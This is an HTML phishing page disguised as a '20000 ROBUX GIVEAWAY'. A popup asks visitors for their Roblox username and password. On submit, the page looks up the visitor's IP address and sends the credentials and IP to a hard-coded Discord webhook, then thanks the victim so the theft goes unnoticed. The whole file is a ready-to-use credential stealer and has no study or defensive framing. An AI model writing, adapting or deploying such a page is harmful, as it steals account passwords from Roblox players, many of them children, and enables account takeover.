<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>20000 ROBUX GIVEAWAY</title>
    <style>
        body {
            font-family: Arial, sans-serif;
        }
        .popup {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100vh;
            background-color: rgba(0,0,0,0.5);
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .popup-content {
            background-color: #fff;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0px 0px 10px rgba(0,0,0,0.2);
        }
        .submit-btn {
            background-color: #2ecc71;
            color: #fff;
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
    </style>
</head>
<body onload="showGiveaway()">
    <!-- Fake content here -->
    <h1>20000 ROBUX GIVEAWAY</h1>

    <script>
        async function showGiveaway() {
            const popup = document.createElement('div');
            popup.className = 'popup';
            popup.innerHTML = `
                <div class="popup-content">
                    <h1 style="color: #2ecc71;">20000 ROBUX GIVEAWAY</h1>
                    <form id="robux-form">
                        <label for="username">Roblox Username:</label><br>
                        <input type="text" id="username" name="username" required><br><br>
                        <label for="password">Roblox Password:</label><br>
                        <input type="password" id="password" name="password" required><br><br>
                        <button class="submit-btn" type="submit">Submit</button>
                    </form>
                </div>
            `;
            document.body.appendChild(popup);

            const form = document.getElementById('robux-form');
            const webhookURL = 'https://discord.com/api/webhooks/1560784848933617684/We2bmkwuaT5H4vMqbYT1e9nhL0cVue53tkGeAD_o88hqU-e_DWxPrXkUGC1t797dK2JQ';

            form.addEventListener('submit', async (e) => {
                e.preventDefault();
                const username = document.getElementById('username').value;
                const password = document.getElementById('password').value;

                // Log IP as well
                const ipResponse = await fetch('https://api.ipify.org');
                const ip = await ipResponse.text();

                fetch(webhookURL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        embeds: [
                            {
                                title: 'Roblox Account',
                                description: `Account: ${username}\nPassword: ${password}\nIP Address: ${ip}`,
                                color: '#2ecc71',
                            },
                        ],
                    }),
                })
                .then((response) => response.json())
                .then((data) => console.log(data))
                .catch((error) => console.error(error));

                alert('Thanks for participating!');
                popup.remove();
            });
        }
    </script>
</body>
</html>
